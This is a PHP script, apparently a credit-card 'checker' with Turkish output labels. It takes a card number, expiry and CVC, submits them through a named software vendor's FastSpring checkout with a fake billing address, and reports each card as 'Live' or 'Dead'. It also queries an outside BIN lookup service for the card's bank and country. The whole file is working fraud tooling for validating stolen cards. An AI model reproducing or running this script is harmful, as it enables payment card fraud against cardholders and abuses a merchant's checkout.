<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$card = isset($_GET['card']) ? trim($_GET['card']) : null;

if (!$card || substr_count($card, '|') !== 3) {
    echo json_encode(['basari' => false, 'mesaj' => 'Format: ?card=NUMBER|MM|YY|CVC'], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    exit;
}

list($n, $m, $y, $c) = explode('|', $card);
$m = str_pad($m, 2, '0', STR_PAD_LEFT);
$y = strlen($y) == 2 ? '20'.$y : $y;

// BIN
$bin = substr($n, 0, 6);
$bin_info = bin_bilgi($bin);

// FastSpring check
$result = fastspring_check($n, $m, $y, $c);

if ($result['approved']) {
    echo json_encode([
        'basari' => true,
        'kart' => $card,
        'durum' => 'Live',
        'mesaj' => '✅ Onaylandı',
        'bin_info' => $bin_info,
        'Developer' => '@TuncaySkay'
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
} else {
    echo json_encode([
        'basari' => false,
        'kart' => $card,
        'durum' => 'Dead',
        'mesaj' => '❌ Reddedildi',
        'detay' => $result['msg'] ?? '',
        'bin_info' => $bin_info,
        'Developer' => '@TuncaySkay'
    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
}

function fastspring_check($n, $m, $y, $c) {
    $VK = "https://www.vandyke.com/cgi-bin";
    $FS = "https://sites.fastspring.com/vandyke";
    $PROD = "securefx1yearlicense";
    $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/149.0.0.0 Safari/537.36";

    $s = curl_init();
    $cookie_file = tempnam(sys_get_temp_dir(), 'fs');

    try {
        // Add to cart + checkout
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$VK/purchase_select_country.php",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                "PID" => "40", "UP" => "1", "COUNTRY" => "us", "STATE" => "KY",
                "privacy_stmt" => "I agree", "PAYMENT_METHOD" => "cc",
            ]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEFILE => $cookie_file,
            CURLOPT_COOKIEJAR => $cookie_file,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => $UA,
        ]);
        curl_exec($ch); curl_close($ch);

        // Confirm payment
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$FS/order/view",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                "confirm" => "confirm",
                "confirm:card_number" => $n,
                "confirm:card_exp_month" => $m,
                "confirm:card_exp_year" => $y,
                "confirm:card_security_code" => $c,
                "confirm:billingSetting" => "true",
                "confirm:country" => "US",
                "confirm:address_1" => "123 Main St",
                "confirm:city" => "Madison",
                "confirm:region" => "US-AL",
                "confirm:postal_code" => "35758",
                "confirm:processCommand" => "confirm:processCommand",
            ]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEFILE => $cookie_file,
            CURLOPT_COOKIEJAR => $cookie_file,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_USERAGENT => $UA,
        ]);
        $resp = curl_exec($ch); curl_close($ch);
        @unlink($cookie_file);

        $approved = (stripos($resp, 'Order Confirmed') !== false || stripos($resp, 'Thank you') !== false);
        $declined = (stripos($resp, 'Order Failed') !== false || stripos($resp, 'could not be accepted') !== false);

        if ($approved) return ['approved' => true, 'msg' => 'Approved'];
        if ($declined) return ['approved' => false, 'msg' => 'Declined'];
        return ['approved' => false, 'msg' => 'Unknown'];

    } catch (Exception $e) {
        @unlink($cookie_file);
        return ['approved' => false, 'msg' => $e->getMessage()];
    }
}

function bin_bilgi($bin) {
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $resp = @file_get_contents("https://bins.antipublic.cc/bins/$bin", false, $ctx);
    if ($resp) {
        $data = json_decode($resp, true);
        return [
            'Banka' => $data['bank'] ?? 'Bilinmiyor',
            'Ulke' => $data['country'] ?? 'Bilinmiyor',
            'Marka' => ($data['brand'] ?? '?'),
            'Tur' => ($data['type'] ?? '?'),
        ];
    }
    return ['Banka' => 'Bilinmiyor', 'Ulke' => 'Bilinmiyor', 'Marka' => '?', 'Tur' => '?'];
}
?>
